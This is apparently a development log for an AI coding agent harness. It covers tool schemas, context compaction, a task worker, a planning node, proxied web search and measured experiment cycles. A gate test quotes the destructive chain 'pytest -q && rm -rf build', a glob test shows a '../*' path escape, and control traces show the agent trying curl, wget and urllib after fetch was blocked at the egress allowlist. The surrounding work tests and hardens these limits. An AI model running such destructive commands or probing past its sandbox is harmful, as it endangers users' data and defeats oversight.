that §13's break-even and FR-207 would agree rather than one overruling the other.

### Stage 8 — four closures

**FR-206 `search_files(pattern, glob, paths_only) -> "path:line: text"`, never file
contents.** That last clause IS the requirement, and it is why `run_shell` with `grep` does
not satisfy it: grep returns every matching line unbounded, which is the context flood
`shrink()` exists to contain. Capped at 50 matches and 120 chars a line, and the result says
when it truncated.

A ripgrep-backed `search_files` could **not** be lifted — `rg` is not in the image. Two things were worth taking: `output_mode:
files_only`, which is literally "paths, not contents", and its description strategy ("use
this instead of grep/find/ls in terminal"), because a search tool the model ignores in
favour of `run_shell` is 621 chars of schema bought for nothing. **Seven of its eight
parameters were deliberately dropped** — sensible at 84 tools, absurd at six.

**A test found a real hole in this, not a review.** The first version claimed to be
workspace-bounded "by construction" because the walk starts at `config.WORKSPACE`. It is
not: `Path.glob("../*")` walks straight out, and the test returned a file from the parent
directory. FR-302 is now enforced twice — on the pattern, so the refusal is something the
agent can act on, and on each **resolved** path, which is the check that actually holds
because a symlink cannot be spotted in a pattern.

**FR-205 git identity in the `Containerfile`.** `git commit` FAILED without it, with "Please
tell me who you are" — a failure that reads as the agent doing something wrong rather than
the image being incomplete.

Closed with a **test, not a scored case**, and deliberately. A case cannot force the agent to
reach for git — it could read the failing test and fix the code without ever running
`git log` — and Phase O already measured what happens when a requirement rests on the model
electing to do something (`learn`, 0 calls in 15 sessions). A case would prove the agent
CHOOSES git; FR-205 asks that git WORKS. `push` stays untestable under restricted egress and
is recorded as asserted rather than demonstrated.

**NFR-802 is a conflict, not a defect**, and it goes in §8.2 where conflicts belong. "All
artifacts under ONE directory" cannot hold: FR-302 confines `read_file` to the workspace, so
a spill written outside it is unreadable by the model — and `shrink()`'s whole design is that
the model can re-read one. NFR-201 puts durable state outside the workspace because
`reset.sh` wipes it. Two declared inspectable roots is the resolution; moving artifacts to
`/state` would satisfy the wording and break the mechanism.

**NFR-701 amended after MEASURING.** The offline suite passes 390/390 on Fedora 41 with
Python 3.13.9 and on `python:3.12-slim` — two distributions, two Python minors, same pins.
Not demonstrated: "natively" (§11 makes a container mandatory anyway) and WSL2. A requirement
nobody can pass is worse than a narrower one that is true.

### Stage 6 — FR-207, and why it came second

§13 costs the decorator at ~25 lines + ~5/tool against ~8/tool written out, **breaking even
above eight hand-written schemas. There were seven.** `search_files` is the eighth — so
building Stage 8 first means CE-02 and FR-207 agree for the first time, rather than a
requirement overruling a live objection.

Nothing elsewhere implements this, checked twice: every use of `inspect.signature`
found was capability probing, never schema construction; tool schemas are
hand-written dicts everywhere.

~150 lines of schema dicts became one line:

```python
TOOLS = {fn.__name__: fn.spec for fn in (read_file, search_files,
         write_file, edit_file, run_python, run_shell)}
```

**Descriptions are NOT derived from parameter names** — they come from the docstring, which
now carries the exact text the dicts used to. `edit_file`'s coaching on picking a unique
snippet is what took real repositories 0/9 → 4/7, and a decorator emitting
`{"type": "string"}` per argument would have satisfied FR-207 while throwing that away.

**The equivalence test pins the hand-written schemas as literals captured BEFORE the
conversion. All six are byte-identical.** That is the entire safety of this change: the
schemas are what the model sees, so a quiet rewording would present as a model regression and
be diagnosed for days.

### The docs pass was aimed at the wrong file until it was measured

**`CONTEXT.md` is not loaded per prompt. `CLAUDE.md` is.**

```
  CLAUDE.md   ~7,157 -> ~3,186 tokens   -55%, on EVERY prompt
  CONTEXT.md ~14,660 -> ~11,378 tokens  -22%, when the spec is read
```

219 of `CLAUDE.md`'s 414 lines were an append-only phase log, every entry of which already
exists in this file and `ROADMAP.md` — duplication, so **deleted rather than moved**, with a
pointer saying where history lives and not to copy it back. What survives is what changes a
decision: ~30 standing lessons, the architecture invariants, the precedence rules, commands,
working guidelines.

`CONTEXT.md` was cut carefully because it is the binding spec: §12's file-list rationale
(195 → 55 lines), §9's built steps collapsed to their exit criteria and traps, §13's stale
worked example and v1 state shape, and the verbose amendment notes in §7 and §11.
**Verified: 109 requirement IDs before, 0 lost; 101 requirement definition lines, all
present.** §9 Step 2's corrections and Step 4's tuning table were extracted programmatically
rather than retyped, so their wording is byte-identical.

Stale facts corrected on the way: "247 unit tests" (390), "three nodes call the model" (only
`act` does), "the workspace as the only bind mount" (four), and "@tool arrives at tool six"
(it arrived at eight).

**395 offline tests**, up from 376. Schema 4,289 of 10,000 chars. Must-haves 29/35,
Definition of Done 9/9.

---

## Stage 3 — Compaction: FR-403/404 built, and two defects found before a line was written

Compaction existed as a verdict that routed straight to `finish`, so `compact` meant "give up
expensively". It now summarises the middle and returns to `act`.

Neither defect below was speculative. One was measured across 466 recorded traces, the other
read directly off `reflect`.

### Defect 1 — §4.3's boundary is invalid in 100% of real runs

> "Compaction preserves the first two messages and the last six verbatim."

The message list alternates `assistant[tool_use]` / `user[tool_result]`, so "the first two"
keeps a `tool_use` whose `tool_result` is message 2 — which the summariser eats. Both
providers reject an orphaned call. Measured over every trace with more than eight messages:

```
  traces examined                            466
  head boundary orphans a tool_use           466   (100%)
  tail boundary orphans a tool_result        282   (61%)
```

§0 says a requirement wins over code, and the disagreement is **stated rather than
reinterpreted**: §4.3's intent (keep the opening and the recent turns) is implemented, its
arithmetic corrected, and the correction written down where the code is.

The fix: snap a boundary onto the nearest turn that does not split a pair,
forward first so an orphaned result folds in with the call it answers. ~30 lines.
It inspects **block types** rather than a role marker, because our messages carry
Anthropic-shaped content lists.

### Defect 2 — the trigger would have looped forever

```python
if state["spent_tokens"] > COMPACT_AT * state["budget_tokens"]:
```

`spent_tokens` is cumulative billing and never decreases. **Compaction shrinks the CONTEXT,
not the bill** — so the moment `compact` stopped being terminal this would fire every turn:
compact, act, compact, act, a model call each time, clearing nothing. FR-403's own wording is
the fix ("when context USE exceeds…"), and the old proxy only worked because the verdict was
terminal.

`COMPACT_AT_CHARS = 45,000`, **derived rather than guessed**: that is where the old trigger
effectively fired, so behaviour stays comparable to every number already recorded. Over the
47 traces that reached it, context was 44,597 chars at the median, and compacting at that
size removes **78% at the median and 60% at worst**.

### What else this closes

- **NFR-403** — before/after/removed_pct on the trace, asserted in a test rather than claimed
  in a comment. Holds on the population it is about: traces large enough to fire. Across ALL
  traces the worst case is 9%, which is a short-history artefact — a six-message history has
  nothing to remove.
- **NFR-401** — a real `budget` verdict. Nothing provided a hard stop before: the old check
  fired at 60% and terminated, which READ as a budget stop while actually being a compaction
  trigger.
- **FR-104** — `replan` maps to `stuck`. It was never one of the four named outcomes and
  fired ONCE in 712 rows; `failures` stays on the row so the cause is still distinguishable.
  The terminal set is now exactly `done` / `stuck` / `budget`, with the turn cap reported as
  `stuck`.

### The test that matters

**Every recorded trace, compacted, checked: 466 in, 466 valid, 0 broken.** It costs a second
of CPU and it is what caught the boundary bug. A summariser failure is also covered — it
inserts a placeholder and carries on, because the run is already in trouble and dying in the
recovery is worse than losing the detail.

Three things the tests caught that review did not: `reflect`'s thrash detector ends a run at
turn 3 when a fake repeats one command, so the end-to-end never reached the threshold until
the command varied; `shrink()` caps each result at 6,000 chars so context grows ~6k a turn
and the first histories were an order of magnitude too small; and the shared `state()` helper
was missing a field, so `compact_count` came back as a `KeyError` rather than 0.

### Not measured, and the expectation is stated before the run rather than after

A budget experiment already refuted the starvation hypothesis — given 1M tokens the agent
used 281–516k and made LESS progress. This is built because FR-403/404 are `[M]` and the
requirement wins, and **the pass rate is expected NOT to move**. The scored stop-gate is
`real-humanize` and `real-click`, 3 runs each: if `compact_count` is 0 across all six the
mechanism never fired and the dev guard is not worth starting.

**410 offline tests**, up from 395. No API key, no network, read-only root.

---

## Stage 5 — Queue, worker and status: three must-haves, no quota

`agent/worker.py`, the last of §12's deferred files to be earned. FR-601, FR-602
and FR-604 had no implementation at all; FR-603 turned out to need none.

**433 offline tests**, up from 410. Zero model quota — the graph is a stand-in throughout.

### What ports, and what cannot

`cron/scheduler.py` is 7,644 lines welded to a 13,732-line state module. None of it comes
across. `cron/executions.py` is 284 lines of stdlib and SQLite, and two ideas in it are worth
having:

- **Idempotent transitions.** `UPDATE ... WHERE id=? AND status='queued'`, then
  `if cur.rowcount != 1: return None`. Two workers racing produce one winner and one `None`,
  because SQLite settles it rather than the read-then-write sequence that would hand the task to
  both. That is NFR-302 expressed in SQL, and the same discipline CE-07 enforces in the graph.
- **Liveness by pid AND start time.** A crashed worker leaves a row saying `running` forever. A
  pid alone cannot detect that — pids are recycled, and the next process to claim one looks
  exactly like the original. The pair cannot be fooled.

**Where this deliberately diverges.** The usual design marks an abandoned execution `unknown` and refuses
to retry, because whether side effects ran is unknown. That is right without checkpoints and wrong here:
this project checkpoints after every node transition and keeps `gate` and `execute` separate
precisely so a resumed run re-classifies rather than re-executes. So an abandoned task goes back
to `queued`, and the worker that picks it up **resumes** — which is FR-603, and the reason
requeueing is safe.

### Two decisions the runs would have punished

**`awaiting-approval` is not decorative.** A worker runs `autonomous=True`, so a `confirm`
becomes a denial (FR-304) and nothing pauses — nobody is watching, and a worker that suspended on
approval would hold the task open until someone happened to look. So the status means something
else here: **the run finished having REFUSED destructive calls**, and the refusals are on the row.
That is what makes **UR-16** — review what was queued while you were away — answerable at all.

**`done` means the AGENT finished the job**, not merely that the worker stopped running it. A
task whose agent ended `stuck` or `budget` is `failed`, with the verdict kept. Filing those under
`done` would make the status column useless: you would have to read the verdict to learn that
nothing was achieved.

### The bug a test caught

`_alive()` had a fast path — `if pid == os.getpid(): return True` — which looked obviously
correct and **skipped the start-time comparison**. That comparison is the only thing separating
the original owner from a process that inherited its number, and the worker's own pid is as
recyclable as any other. The fast path is gone; the test that found it is
`test_a_recycled_pid_is_not_mistaken_for_the_original`.

### End to end

```
$ python -m agent --submit "Fix the failing tests."
queued a37305ee

$ python -m agent --tasks
task       status             verdict   goal
2ac21222   queued             -         Add a CSV exporter.
a37305ee   done               done      Fix the failing tests.
```

**FR-605/606/607 stay deferred** — cron, attach/detach and a worker cap are all `[S]`, and §9
puts `[S]` behind the `[M]` set. **FR-703's other half closes here**: "list threads *and* tasks".

---

## Stage 7 — The plan node, and the cycle that actually moved the number

Two cycles, measured separately. The first satisfied three requirements and moved nothing;
the second moved **1/3 → 5/6** and cost less.

### Cycle A — a plan node with a message list of its own

**Hypothesis.** Nine scored runs across three earlier cycles never produced a plan because
planning was built as a PHASE, and a phase inherits the tool-call history — which on this
provider keeps producing tool calls whether or not a tool is offered. A node with a FRESH
context would not.

**Verified before building, ~3k tokens.** The converse was already measured (history →
tool calls, even with `tools` absent). This was the half that had not been: a clean history
returned `finish_reason: stop` with three parseable steps.

**Change.** `plan`, a second model-calling node, called with `[{"role": "user", "content":
goal + digest}]` and nothing else. The digest is free — `_outcomes()` already pairs every
call with whether it succeeded, so files read, commands that worked and errors hit come out
of state with no second model call. `adopt` stops parsing and becomes approval only.

`plan` and `adopt` stay separate and **CE-04 does not apply**: `adopt` suspends on
`interrupt()` and re-runs from its first line on resume, so merging them would spend a model
call on every resumed approval. That is CE-07's rule applied to the node that calls a model.

**Before / after.**

| | pass | verdicts | turns | fell back | tokens |
|---|---|---|---|---|---|
| phase (3 earlier cycles) | 1/3 → 3/3 → 2/3 | — | — | **True, 9/9** | — |
| plan node | **1/3** | stuck ×3 | 12/12/12, all at cap | **False, 3/3** | 82,435 |

**Kept.** FR-101, FR-105 and FR-702 are satisfied — a real plan, every run. **And the pass
rate did not move at all.** Recorded as such rather than dressed up.

### Cycle B — research can run the test suite

**Hypothesis, from cycle A's traces.** Turn 1 of every planning run is `pytest -q`, the
read-only gate refuses it, and the agent then spends its remaining research turns GUESSING
which file is broken from `find` and `read_file`. It is planning a fix for a failure it has
never observed. `plan_denied` recorded `pytest -q` in **all twelve** planning runs ever.

**Change.** `pytest` and `python -m pytest` join the read-only allowlist. Bare `python`
stays denied — `python setup.py build` is a build, not a read — and redirects and chains are
still refused (`pytest -q > out.txt` and `pytest -q && rm -rf build` both deny, tested).

**Before / after.**

```
planning, blind        1/3   stuck x3   turns 12/12/12 (all at cap)   82,435   denied ['pytest -q']
research runs pytest   3/3   done  x3   turns  7/ 7/ 3               72,094   denied []
repeat                 2/3   done  x2   turns  8/ 4/10               93,322   denied []
```

**5/6 combined, up from 1/3, and causal rather than lucky.** Plans dropped from 5–6 steps
with redundant re-reads to 3 tight ones, and runs stopped dying at the cap. **Kept.**

**NOT reported as 3/3.** The first n=3 gave it; the repeat gave 2/3. Banking the better of
two identical runs is the error this project has already retracted twice, and it is why the
repeat was run at all.

**The residual risk, stated rather than waved away:** a test suite executes project code and
could in principle write. Accepted — the planning gate exists to prevent unapproved EDITS,
and running the suite is not an edit. The agent runs it in the working phase regardless.

### Why the sixth run failed, and neither half is about planning

```
6  edit_file  app/routes/items.py   <- registered GET; the test needs POST (assert 405 == 201)
7  read_file  app/routes/items.py
8  read_file  app/routes/items.py   <- thrash detector fires
9  read_file  app/routes/items.py      stuck at turn 4 of 12
```

The plan was correct. The agent wrote the wrong HTTP method, then spun re-reading its own
edit and was killed with 8 turns still available. **Two candidate cycles, neither taken:**
the thrash detector counts three identical READS as thrash, though a read is idempotent and
the harmful signal is a repeated write; and `edit_file` returns `"edited X (replaced N
chars)"` without showing the result, which is plausibly *why* it re-read three times.

### Default stays off, for a new reason

It used to be "the plan is never written". That is fixed. It is off because **NFR-402 is
still breached at 72–93k against 60,000** — research spends 5 turns before work begins. On
by default would trade a requirement nobody can see for a cost ceiling everybody measures.

### Two defects this found in the rig, not the agent

- **`AGENT_PLAN` was not in `FORWARDED_ENV`.** With `PLAN_ENABLED` defaulting to off, a
  scored run had no way to turn planning ON. Every kill switch has to be reachable from
  there or the controlled comparison it exists for cannot be run.
- **The node read `prompts/STEPS.md` inside the `try`.** The file did not exist on the first
  run, the `FileNotFoundError` was swallowed as a provider error, and the node fell back to
  the goal on every call — looking exactly like the bug the stage was built to fix. Prompts
  are version-controlled files (NFR-603); a missing one now fails loudly, with a test.

**441 offline tests.** Today's scored spend **790,732 tokens, 72%** of the measured
free-tier ceiling — stopped there rather than pushing into the throttle, where ~2 of 3
requests are rejected and a run completes with probability under 1%.

---

## Stage 4 — Web search: 0/9 without it, 9/9 with it, and the last must-have closes

FR-501 was the only unmet `[M]` requirement. **Must-haves are now 35/35.**

```
  control    web_search REMOVED   pass 0/9   stuck x9   234,818 tokens
  treatment  web_search exposed   pass 9/9   done  x9   210,548 tokens
```

Cheaper AND passing, which is not the usual shape: the control runs spend their turns
failing at a wall, the treatment runs finish in 3-7 turns against a cap of 10.

### The stop-gate came first, and it was free

Three unknowns, none settled by reading:

```
  1. does primp honour HTTPS_PROXY?   ddgs uses primp (Rust), NOT httpx - and the
                                      openai SDK's proxy support comes from httpx
                                      running trust_env=True. No such promise here.
  2. does tinyproxy permit the host?  CONNECT filter, allowlisted by hostname.
  3. is backend= a real restriction?  `auto` fans out across EIGHT engines.
```

All three answered in one container run for zero model quota: 5 results through the proxy,
and `backend="mojeek"` refused at the proxy while `backend="duckduckgo"` succeeded - so the
allowlist is a real boundary rather than a decoration.

### The first live run refuted the design, and the design was mine

`web_search` shipped its first version with `backend="duckduckgo"` **pinned**, so that a case
could declare ONE host and have that be the whole truth. The reasoning was sound and the
measurement killed it:

```
  search 1                ->  5 results
  search 2, immediately   ->  "No results found."
  +5s, +10s, +15s         ->  still blocked
  ~30s of SILENCE         ->  recovered
```

Every attempt re-arms the cooldown, so **a retry makes it strictly worse** - which is why
there is no retry in the tool. One engine means one search per ~30 seconds, and an agent that
searches twice in a row gets an empty second search that reads as "the web has no answer".
That is infrastructure failure wearing a capability limit's costume, and this project has a
standing rule against scoring one.

```
  backend="auto", six searches back to back, no pacing:
  6 of 6 returned 5 results, 1.5s to 4.7s each.
```

The honesty property survives a different way: `WEB_HOSTS` names all eight hosts the library
may dial, each case declares all eight, and the manifest records what was granted. **A test
asserts WEB_HOSTS against the engine list ddgs actually ships**, so a ninth engine fails the
suite rather than silently escaping the allowlist.

### Also refuted: the error message

The first version mapped every `DDGSException` to "the egress allowlist is wrong". ddgs uses
that one exception type for BOTH an empty result set and a transport failure, so a query that
simply matched nothing was reported as a broken network. Now an empty result RETURNS a
message rather than raising - raising would spend a `failures` count toward `stuck` on a
search that worked fine - and a real transport failure raises without naming a cause it
cannot distinguish from inside the container.

### What the control proves, and what it does not

The control is the same binary with one tool removed (`AGENT_WEB=off`), which is the standing
rule that saved Phase L from shipping a capability claim its own baseline did not support.
The traces show the agent trying hard and having nowhere to go:

```
  run 0   fetch pypi.org -> blocked      fetch api.github.com -> blocked   stuck @ 3
  run 2   curl, wget, urllib, then read the INSTALLED ddgs/__init__.py     stuck @ 10
```

**Stated rather than glossed:** the control fails partly BECAUSE the allowlist carries only
the eight search hosts, so `fetch` had nowhere to land. This measures that search was the
only GRANTED route, not the only conceivable one. Allowlisting pypi.org would have been a
test of `fetch`, which the existing `web` split already covers - but that was a choice, and
it belongs here rather than buried in a config file.

The treatment traces show the intended shape end to end:

```
  web_search "ddgs pypi"     -> finds https://pypi.org/project/ddgs/
  fetch      pypi.org        -> BLOCKED at the allowlist
  web_search "ddgs GitHub"   -> the snippet itself carries "deedy5"
  write_file answer.txt      -> deedy5
```

`web_search` fired in **all nine** runs, 1-3 calls each - checked on the traces, because a
pass rate is not evidence for a mechanism that did not fire.

### The cases, verified three ways before a token was spent

Two ways does not catch a fixture that contains its own answer. All three columns measured,
free:

```
  case             untouched   plausible-guess    correct-answer
  search-author    FAIL        FAIL (octocat)     PASS (deedy5)
  search-editors   FAIL        FAIL (Guido...)    PASS (Turner / van Kemenade)
  search-release   FAIL        FAIL (2025-10-01)  PASS (2025-10-07)
```

Chosen for OBSCURITY rather than difficulty: a fact the model already knows makes the control
pass and the measurement worthless. All three are stable past events that a search finds in
the SNIPPET, so no case depends on `fetch` succeeding.

### agent/web.py was permitted and still not created

§12 defers it "when FR-501/502 enter scope" and that trigger fired. It bounds what MAY exist,
not what must - and a module for one decorated function costs a Definition-of-Done item,
since NFR-601 asks that adding a tool require editing exactly one file and a new module means
editing `registry.toolset()` too. Written into §12 itself rather than left to be noticed.

### Two defects this found in the rig

- **The summary row recorded `mcp` but not the built-in tool set.** A control row and a
  treatment row differed only by `schema_chars`, so the single condition the whole comparison
  turns on was not written down anywhere a later reader could check. The row now carries the
  exposed toolset. Same shape as the `AGENT_EGRESS` defect: a condition nobody recorded.
- **`AGENT_WEB` had to be added to `FORWARDED_ENV`**, which is Stage 7's lesson arriving one
  stage later. A test now derives the switch list from `config.py`'s own source and fails when
  a new one is unreachable, so the NEXT occurrence is caught the day it is added rather than
  the day someone tries to run the comparison.

**456 offline tests**, up from 441. Scored spend for the stage: **445,366 tokens** across
both halves.

---

# 2026-08-30 — eight cycles, four of them refutations

The must-have set closed the day before. Everything here is measurement, and the
honest headline is that **four separate explanations for the real-repository
failure were tested and killed.** `real-humanize` ended the day at 1 pass in 9
runs, and in the failing runs the information the agent needed was on its screen.

Scored spend: **3,677,100 tokens** across five suites. That alone retires the
"~1.1M/day free-tier ceiling" this project has been planning around - no throttle
was ever observed.

---

## Cycle A — Three instruments, because the next measurement could not be read

**No quota.** Built before the compaction stop-gate, because that stop-gate had no
readable answer.

1. **Peak context on every turn.** `before`/`after` live on the `compact` trace
   entry, which by definition exists only once compaction has fired. A stop-gate
   returning `compact_count: 0` across six runs was therefore uninterpretable -
   peaking at 44,000 chars means raise the threshold, peaking at 12,000 means
   compaction is irrelevant. Recorded in `reflect`, where the value is already
   computed for the trigger.

2. **A run that vanishes is now loud.** The result line is printed by the
   CONTAINER, so a container that dies without writing returns a code that is
   neither BLOCKED nor MISCONFIGURED - the retry loop breaks and the suite moves
   on with the denominator one smaller. Observed the day before: `run 0` left no
   row and no line. No row is synthesised; inventing one for a half-executed run
   would be a fabrication.

3. **`AGENT_COMPACT_AT` / `AGENT_MAX_COMPACTIONS`.** A threshold that can only be
   changed by editing `config.py` cannot be tuned by measurement, only by
   argument.

**All three earned themselves the same day.** Instrument 1 produced the finding in
Cycle C; instrument 2 fired twice on abandoned runs; instrument 3 made Cycle F's
experiment possible at all.

---

## Cycle B — Stage 3 Task 6: compaction fires, and one run shows it failing

**The stop-gate passed decisively. Compaction fired in 6 of 6 runs** - the first
time it has ever fired in a live scored run.

```
                pass  turns  compact#  removed %                peak_ctx
real-humanize 0   F     20       1     [49.4]                    45,290
real-humanize 1   F     20       1     [66.2]                    49,679
real-humanize 2   F      7       3     [0.2, 3.1, 0.7]           72,027   <- broken
real-click    0   T     29       3     [63.6, 50.7, 72.0]        50,842
real-click    1   T     29       1     [77.4]                    46,181
real-click    2   T     31       2     [73.5, 75.6]              46,596
```

`real-click` went **0/3 in the Phase J baseline to 3/3**. NOT a controlled
comparison - `edit_file`, `read_file`, `search_files`, memory, skills and the plan
node have all changed since - and it is recorded as the first completion of that
case, not as evidence compaction caused it.

**The finding is `real-humanize` run 2.** Compaction fired three times, removed
0.2%, 3.1% and 0.7%, hit `MAX_COMPACTIONS` and killed the run as `stuck` at turn 7
of 30 - 23 turns unused, three model calls spent achieving nothing. The trace:

```
context  8,665 -> 9,101 -> 11,444 -> 12,217 -> 65,085   (+52,868 in ONE turn)
COMPACT  before 65,085  after 64,929  removed_messages 2  = 0.2%
```

One assistant TEXT block of 52,866 chars - 73% of the whole context. `shrink()`
was working correctly (`max_result_chars` 5,851 against a 6,000 cap); nothing
bounded the model's own prose. §4.3 assumes context grows through tool results.
Here it grew through the model.

**Kept.** Cost: 1,867,801 tokens across both cases.

---

## Cycle C — Cap the model's own text — KEPT

Derived, not picked. Across all 460 recorded assistant text blocks the
distribution is bimodal with an empty middle: p50 135 chars, p95 1,028, then
nothing at all between 2,796 and 9,047 before a tail running to 64,918. Any cap
inside that gap truncates the identical 15 blocks (3.3%), so the number is
insensitive. `MAX_RESULT_CHARS` is 6,000 and sits in the gap - the same cap for
the same reason, applied where it had been left off.

```
                peak_ctx   compact#   removed %          turns   verdict
BEFORE  run 0     45,290       1       [49.4]              20     stuck
BEFORE  run 1     49,679       1       [66.2]              20     stuck
BEFORE  run 2     72,027       3       [0.2, 3.1, 0.7]      7     stuck
AFTER   run 0     29,930       0       []                  13     stuck
AFTER   run 1     39,549       0       []                  14     stuck  PASS
AFTER   run 2     45,022       1       [54.8]              17     stuck
```

Every mechanical prediction held: the pathological shape is gone, peak context is
capped at 45,022 against 72,027, and the one compaction that fired removed 54.8%.
Tokens fell 39% (733,734 -> 595,813).

**The pass rate moved 0/3 -> 1/3, and I had registered that it would NOT.** By
this project's own rule that is a hypothesis, not a finding - and it is still
unrepeated. The passing run also ended `stuck`: it fixed the tests and then ran
out of turns.

**A consequence worth recording:** with the cap, `real-humanize` compacted 0, 0, 1
times against 1, 1, 3 before. Cycle B's "compaction fires 6/6" describes a system
this cycle changed. The `real-click` half is unaffected - its context came from a
long history, not one giant message.

---

## Cycle D — The thrash detector: a repeated READ is not thrash

Two runs of `real-humanize` were identical for twelve turns:

```
failing   read 502,58   read 502,58   read 502,58   -> STUCK at turn 13 of 30
passing   read 502,58   read 502,58   edit_file     -> 4 failures -> 0
```

The difference between pass and fail was ONE READ. A read is idempotent -
repeating one changes nothing and signals confusion, not a loop. The harmful
pattern is a repeated WRITE or failing command. This matters most on real
repositories, where the recorded read-to-write ratio is 37:1.

The shape: keep idempotent
tools apart from mutating ones and gives the idempotent set a LARGER budget rather
than exempting it. That refinement matters - five identical reads really is a
loop. No code was taken; risk comes from `policy.RISK`, which already classifies
every tool.

```
REPEAT_LIMIT = {"read": 5, "write": 3, "destructive": 3}
read_file x3 -> continue   x5 -> stuck
run_shell x2 -> continue   x3 -> stuck
```

**MEASURED ONLY INDIRECTLY, and that is a gap.** Its own scored run was abandoned
after three `APITimeoutError` blocks and then stopped so Cycle E could land. The
dev guard (Cycle G) shows it costs nothing on short work, and Cycle E's runs show
turns rising 13 -> 22 where a run previously died - survival, not progress.

**Kept, unproven.**

---

## Cycle E — The prompt was NOT manufacturing the reads — REVERTED

**Hypothesis.** `SOUL.md` rule 1 said *"Read before you edit. Never write a file
you have not read"*, and `edit_file` returned only a character count. We command a
read before every edit, then hand back no evidence it landed - so the model reads
again to check. One agent has no read-before-edit gate at all and its edit tool says
*"do NOT re-read the file to check the write landed"*; its trajectory mining
measured 154 verify-reads per 400k messages and engineered them out.

**Change.** Prose only. The read gate narrowed to `write_file` (which overwrites
everything) and dropped for `edit_file` (which refuses unless the snippet matches
exactly once). Three rules added: change the code with the tools not in your
reply; do not stop after a plan; and a "When you are stuck" section.

**Result.**

```
                passes   total writes   turns        tokens (median)
BEFORE            1/3          1        13/14/17       177,411
AFTER             0/3          1        22/13/13       171,823
```

**Writes did not move.** One write across three runs, identical to baseline, and
the single pass disappeared. All three runs ended `stuck` with the same 4 failing
tests they started with.

**REVERTED**, on two rows of its own pre-registered reading table at once. 0/3 vs
1/3 is inside this case's noise; the write count is not, and the write count is
what the cycle targeted.

---

## Cycle F — 100k-char result caps are incompatible with our compaction — ABANDONED

**Hypothesis, and it was wrong.** `pytest -q` emitted 346 lines / 49,629 bytes and
`shrink()` returned 4,784. I checked for `E AssertionError` lines, found three of
four missing, and concluded the agent could not see the bug. Some agents cap file and
terminal results at 100,000 chars - 16.7x ours.

**Refuted before it was measured, by reading the tail I had never looked at.**
pytest's `short test summary info` block lands in the last 20 lines and carries
every input and every expected value:

```
FAILED test_metric[[999.9,     'V']-1.00 kV]  - assert '1000 V'  == ...
FAILED test_metric[[999.99,    'V']-1.00 kV]  - assert '1000 V'  == ...
FAILED test_metric[[999999,    'V']-1.00 MV]  - assert '1000 kV' == ...
FAILED test_metric[[0.0009999, 'V']-1.00 mV]  - assert '1000 μV' == ...
```

**The agent saw all four failures on turn 1 and still wrote nothing.** The
diagnosis was mine and it was sloppy - I never checked what the tail contained
before calling truncation the cause.

**A real structural finding came out of it anyway.** Raising the cap to 100,000
broke 15 tests, and one failure was genuine: compaction returned `after == before`.

```
protected messages     HEAD 2 + TAIL 6 = 8
one result may hold    100,000 chars
protected region       can hold 800,000 chars alone
threshold              200,000

compaction can only help while COMPACT_AT_CHARS > (HEAD+TAIL) x MAX_RESULT_CHARS
```

With a 100,000-char result cap, 8 protected messages can hold four times the
threshold that triggers compaction - so it fires, finds nothing removable, and
dies at `MAX_COMPACTIONS`. That is `real-humanize` run 2 as the DEFAULT
configuration. Raising the cap is a compaction redesign, not a config change.

Also caught: raising `MAX_RESULT_CHARS` silently undid Cycle C, because
`shrink()` bounds every per-tool cap by it. `model_reply` needs its own entry.

**Not committed. Caps unchanged at 6,000 / 45,000.**

---

## Cycle G — Dev regression guard — 14/15, unchanged

Three committed-but-unproven changes at once (the cap, the thrash fix, the
instruments), which breaks one-change-per-cycle and is stated rather than hidden:
had the score moved, it could not have been attributed.

```
pass            14/15, unchanged
compaction      fired 0 of 15 runs
peak context    3,756 / 8,309 / 14,583   against a 45,000 threshold
NFR-402         28,072 median / 60,000   OK
NFR-104          4,604 largest / 6,000   OK
```

**Short cases peak at a third of the compaction threshold** - so compaction is
structurally irrelevant to dev work, not merely idle. Only visible because Cycle A
records peak context on every turn.

`add-endpoint` came in at 2/3 with planning off, against a recorded 1/3 baseline
for that configuration. Cost: 521,461 tokens.

---

## Cycle H — The model comparison cannot be run on this key

The one lever with recorded evidence behind it - a model swap once moved 4/15 ->
14/15 with zero code changes. Six candidates passed the tool-calling probe. Then:

```
nemotron-3-super-120b-a12b      2.1s   ok      <- the model we are on
nemotron-3-ultra-550b-a55b    300.1s   TIMEOUT
moonshotai/kimi-k3             90.6s   TIMEOUT
deepseek-v4-pro-0813           90.3s   TIMEOUT
openai/gpt-oss-120b            90.3s   TIMEOUT
deepseek-v4-flash-0731         90.1s   TIMEOUT
moonshotai/kimi-k2.6            0.6s   NotFoundError
```

**Every alternative fails a 16-token "say ok" request.** Exactly the failure
`config.py` already records for `llama-3.3-70b`: passes the probe, then the
endpoint stops responding. A free-tier capacity property, not a property of the
models. Cost: ~600 tokens.

**The model hypothesis is untestable without a different provider.**

---

## What this day establishes

**Four explanations tested and dead:** the prompt manufacturing reads (measured,
zero effect); the thrash detector as the blocker (limits raised, still no writes);
truncation hiding the failures (disproved - the agent saw all four); and a better
model (unavailable).

`real-humanize` is **1 pass in 9 runs** across four configurations. In the failing
runs the four assertions, with inputs and expected values, were on screen from
turn 1. The agent read, experimented, and did not edit.

**Two things remain unspent with evidence behind them:** `edit_file` returning a
unified diff rather than a character count - the mechanism aimed squarely at an
agent that does not trust its edit landed - and a provider that
serves more than one model.

**A rig lesson worth the entry:** every fixture that sized itself with a magic
number stopped testing what it was named after the moment a constant moved.
`test_a_large_context_compacts` passed while asserting the thrash detector. They
now derive from the constants, verified at two settings.

---

# 2026-08-30, second half — three rig defects, and the one that invalidated the day

The morning's eight cycles are logged above. This half found **three defects in the
measuring apparatus**, one of which had been silently corrupting results for hours,
and produced the first `real-humanize` number of the day that is not confounded by
something later discovered.

---

## Cycle I — `edit_file` returns a diff, and verifies the write — `a614f59`

**Hypothesis.** A character count is not evidence. `edit_file` returned
`"edited x.py (replaced 412 chars with 480, +2 lines)"`, so the agent had no way to
know the edit was what it intended and re-read to check - and re-reading is what
the thrash detector then punishes.

One agent's patch tool returns a unified diff and its description says *"do NOT re-read
the file to check the write landed"*; its trajectory mining measured 154
verify-reads per 400k messages and engineered them out.

**Change.** A unified diff, bounded twice; a write that does not persist now RAISES
rather than reporting success.

**Bounded twice, and the second bound was caught by its own test.** `DIFF_LINES`
caps diff lines at 40 - but 40 lines of 300 chars is 12,000, double
`MAX_RESULT_CHARS`. `DIFF_LINE_CHARS` caps the width at 120. Same trap `shrink()`
already carries: NFR-104 bounds CHARACTERS while a line count bounds LINES.

**Kept, and its measurement is disputed** - see Cycle L.

---

## Cycle J — Warn before killing, and hash the RESULT — `35ca171`

Two halves of a guardrail design that the morning's thrash fix left behind.

